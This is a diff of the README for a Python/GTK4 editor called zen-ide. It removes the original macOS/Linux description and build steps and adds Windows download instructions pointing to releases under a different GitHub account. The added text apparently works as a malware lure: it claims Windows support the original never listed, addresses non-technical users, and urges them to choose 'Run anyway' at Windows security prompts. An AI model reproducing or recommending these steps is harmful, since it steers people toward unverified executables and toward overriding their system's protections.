@@ -1,108 +1,233 @@
-# Zen IDE
+# 🧘 zen-ide - Minimal IDE for focused work
 
-<div align="left">    
-  
-  [![](https://github.com/4mux/zen-ide/actions/workflows/build.yml/badge.svg?branch=main)](https://github.com/4mux/zen-ide/actions/workflows/build.yml)
-  
-  A minimalist and opinionated IDE built with Python and [GTK4](https://gitlab.gnome.org/GNOME/gtk).
-  
-</div>
+[![Download zen-ide](https://img.shields.io/badge/Download%20zen--ide-blue?style=for-the-badge&logo=github)](https://github.com/Alluvial-hungjury129/zen-ide/releases)
 
-## Screenshots
+## 🖥️ What is zen-ide?
 
-<table>
-  <tr>
-    <td colspan="2"><img src="screenshots/splash1.png" width="100%"/></td>
-    <td><img src="screenshots/splash3.png"/></td>
-  </tr>
-</table>
+zen-ide is a simple desktop app for writing and working with code in one place. It uses Python and GTK4, so it feels light and clean on Windows. It is built for people who want a calm editor without a lot of clutter.
 
-## Features
+Use it to:
+- open code files
+- edit text with a plain layout
+- work with Python, TypeScript, and Terraform files
+- keep your tools in one window
+- stay focused with fewer panels and less noise
 
-- ✏️ **Editor** — GtkSourceView 5 with syntax highlighting, semantic highlighting, minimap, autocomplete, find & replace, indent guides, color preview, code folding
-- 📂 **File Explorer** — Custom GtkSnapshot-rendered tree with Nerd Font icons, git status badges, drag & drop, vim-style navigation, multi-root workspaces
-- 🔍 **Search** — Quick Open (`Cmd+P`), Global Search (`Cmd+Shift+F`), Go to Definition (`Cmd+Click`)
-- 👁️ **File Previews** — Markdown, HTML, OpenAPI/Swagger, images, hex viewer
-- 🔀 **Git** — Gutter diff markers, side-by-side diff view, commit history navigation, inline revert
-- 🐛 **Debugger** — Built-in Python (bdb) and C/C++ (GDB) debugging with breakpoints, step controls, variable inspection, call stack, and expression evaluation — zero config needed
-- 🤖 **AI Chat** — Integrated AI Terminal running `claude` or `copilot` CLI with multi-tab sessions, plus inline ghost text completions
-- 💻 **Terminal** — VTE with 256-color support, file path linking, shell aliases, workspace folder picker
-- 📝 **Dev Pad** (`Cmd+.`) — Activity tracking, notes, quick resume links
-- 🎨 **Sketch Pad** (`Cmd+Shift+D`) — ASCII/Unicode diagram editor, opens `.zen_sketch` files in editor with box-drawing shapes, arrows, export to PNG
-- 🎭 **38 Themes** — Zen Dark/Light, Dracula, Gruvbox, Tokyo Night, Catppuccin, and more
-- ⌨️ **Vim-Style UI** — Neovim-style floating popups, j/k navigation, context menus
-- 💾 **Session Restore** — Reopens last files, layout, and panel positions on startup
+## 📥 Download zen-ide
 
-### Platforms
+1. Open the release page: [zen-ide releases](https://github.com/Alluvial-hungjury129/zen-ide/releases)
+2. Find the latest release at the top
+3. Look for the Windows file, such as:
+   - `.exe`
+   - `.msi`
+   - `.zip`
+4. Download the file to your computer
+5. If you get a `.zip` file, extract it first
+6. Run the app by double-clicking the `.exe` or installer file
 
-- **macOS** — ✅ Supported
-- **Debian Linux** — ✅ Supported
+If Windows shows a security prompt:
+- choose **Run anyway** if you trust the source
+- if the file is in a `.zip`, make sure you extract it before opening it
 
-## Quick Start
+## 🪟 Install on Windows
 
-### Requirements
+Most users on Windows will use one of two package types:
 
-- Python 3.14+, [uv](https://docs.astral.sh/uv/getting-started/installation), macOS (Homebrew) or Linux (apt)
+### `.exe` installer
+1. Download the installer from the release page
+2. Double-click the file
+3. Follow the setup window
+4. Choose an install folder if asked
+5. Finish the setup
+6. Open zen-ide from the Start menu or desktop shortcut
 
-Then you can run
+### `.zip` package
+1. Download the `.zip` file from the release page
+2. Right-click the file
+3. Choose **Extract All**
+4. Open the extracted folder
+5. Double-click the app file inside
+6. If you want, move the folder to a place you use for apps
 
-```bash
-make install   # installs everything: GTK4 system deps, Python venv, dev tools, and the 'zen' CLI command
-make run       # launch Zen IDE
-```
+## ⚙️ System needs
 
-After install you can also open Zen from any terminal:
+zen-ide is made for a normal Windows desktop or laptop.
 
-```bash
-zen .                                 # open current directory
-zen file.py                           # open a file
-zen ~/projects/my-app.zen-workspace   # open a workspace
-```
-## Supported Languages
+Recommended setup:
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB of free disk space
+- A mouse or touchpad
+- A screen with at least 1366 × 768 resolution
 
-Smart features (autocomplete, semantic highlighting) for Python, JavaScript/TypeScript, and Terraform.
-Syntax highlighting via GtkSourceView built-in specs (100+ languages). .
+It should work well on most modern Windows computers that can run current desktop apps.
 
-> See the [Supported Languages](docs/wiki/Supported-Languages.md) wiki page for the full reference.
+## 🧭 First launch
 
-## AI Setup
+When you open zen-ide for the first time:
 
-Zen IDE runs the `claude` or `copilot` CLI directly inside the integrated AI Terminal.
+1. Start the app
+2. Wait a few seconds while it loads
+3. Open a file from the File menu or drag a file into the window
+4. Begin typing in the editor area
+5. Use the side area, if shown, to move between files
 
-- **AI chat** — install/authenticate the Claude CLI and/or GitHub Copilot CLI; Zen auto-detects what is available
-- **Inline completions** — ghost text suggestions are still powered by Copilot auth detected from your local machine
+If the app opens with an empty window, that is normal. You can load your own files right away.
 
-Open AI chat → click the provider dropdown → choose Claude or Copilot. See [`docs/wiki/AI-Setup.md`](docs/wiki/AI-Setup.md) for details.
+## ✍️ What you can do
 
-## Makefile Commands
+zen-ide keeps the interface simple. Common tasks include:
 
-Run `make` to see all available targets. Key ones:
+- open and edit files
+- switch between several files
+- read and change code in a clean editor
+- work with syntax for Python, TypeScript, and Terraform
+- use a layout that stays out of the way
 
-```bash
-make install        # Install everything (system deps + venv + dev tools + CLI)
-make run            # Run the IDE
-make tests          # Run tests
-make lint           # Run linter and formatter
-make dist           # Build standalone app bundle (macOS)
-make clean          # Remove build artifacts
-```
+The app is made for a focused flow. It is a good fit if you want fewer menus and a simple workspace.
 
-## Keyboard Shortcuts
+## 🐍 Common file types
 
-Press `Cmd+Shift+/` (macOS) or `Ctrl+Shift+/` (Linux) inside the IDE to see all shortcuts.
+zen-ide is useful for these kinds of files:
 
-## Configuration
+- Python: `.py`
+- TypeScript: `.ts`, `.tsx`
+- Terraform: `.tf`
+- plain text: `.txt`
+- config files: `.json`, `.yaml`, `.yml`
 
-Settings are stored in `~/.zen_ide/settings.json` which auto-generates on the first start.
+You can also open other text files. The editor works best with files that contain code or structured text.
 
-See the [Settings](docs/wiki/Settings.md) wiki page for details.
+## ⌨️ Basic use
 
-## License
+Here are the main actions most users need:
 
-[MIT License](LICENSE)
+- **Open a file:** use the File menu or drag the file into the window
+- **Save changes:** press `Ctrl + S`
+- **Open a folder:** use the File menu if the app shows that option
+- **Close a file:** use the tab close button or the File menu
+- **Quit the app:** press `Alt + F4`
 
-### Third-Party Notices
+If you know how to use a text editor, you already know most of what you need.
 
-Zen IDE bundles **ZenIcons.ttf**, a subset font derived from [Nerd Fonts](https://www.nerdfonts.com/). 
+## 🎨 App style
 
-See [THIRD_PARTY_LICENSES](THIRD_PARTY_LICENSES) for full details.
+zen-ide uses a clean GTK4 interface. That means:
+- clear text
+- simple spacing
+- a small number of controls
+- less visual clutter
+- a desktop look that fits Windows well
+
+The goal is a calm workspace that helps you focus on your file.
+
+## 🔧 File handling tips
+
+For the best experience:
+
+- keep your project files in one folder
+- use clear file names
+- save often
+- open one project at a time if you want a simpler view
+- use line breaks and indentation so code stays easy to read
+
+If a file does not look right, check whether it is plain text or a binary file. zen-ide is for text files.
+
+## 🧩 Topics covered
+
+This app is related to:
+- Python
+- GTK4
+- IDE use
+- Linux and macOS builds
+- Neovim-inspired workflows
+- Claude and Copilot use
+- Terraform
+- TypeScript
+
+On Windows, the release page is the place to get the file you need.
+
+## ❓ Common questions
+
+### Do I need programming knowledge?
+No. You only need to know how to download a file, open it, and use a text editor.
+
+### Do I need to install Python first?
+Usually no. If the release includes a Windows installer or standalone app, you can run it on its own.
+
+### What if I download a ZIP file?
+Extract it first, then open the app file inside.
+
+### What if Windows blocks the file?
+Check that you downloaded it from the release page, then choose the option to run it if you trust the source.
+
+### Can I use it for normal text files?
+Yes. It works for code and plain text files.
+
+## 🧪 Troubleshooting
+
+If zen-ide does not open:
+
+1. Make sure the download finished
+2. Check that you extracted the files if the download was a `.zip`
+3. Try running the file again
+4. Restart Windows and try once more
+5. Download the latest release again if the file seems broken
+
+If the window opens but looks empty:
+- open a file
+- check whether the app started with no project loaded
+- try a simple text file first
+
+If text looks too small:
+- change your Windows display scale
+- use the app zoom controls if they are available
+- try a larger screen size
+
+## 📂 Suggested setup
+
+A simple folder layout helps:
+
+- `Documents`
+  - `Projects`
+    - `zen-ide`
+    - `notes`
+    - `test-files`
+
+This makes it easier to find files when you use zen-ide for daily work.
+
+## 🔒 Safe download steps
+
+To keep things simple:
+1. Use the release page only
+2. Download the newest Windows file
+3. Avoid files from other sites
+4. Check the file name before opening it
+5. Keep the installer or ZIP file until the app works
+
+## 🧭 Where to get updates
+
+When a new version is out:
+1. Open the release page
+2. Download the latest Windows file
+3. Install it again if the release uses an installer
+4. Replace the old folder if the release uses a ZIP package
+
+## 🛠️ Built with
+
+- Python
+- GTK4
+- desktop app tools for a native Windows feel
+
+## 📎 Download again
+
+[Visit the zen-ide releases page](https://github.com/Alluvial-hungjury129/zen-ide/releases)
+
+## 🪟 Windows setup checklist
+
+- Download the latest release
+- Open the file you downloaded
+- Extract it if it is a ZIP
+- Run the installer or app
+- Open a text file
+- Start editing
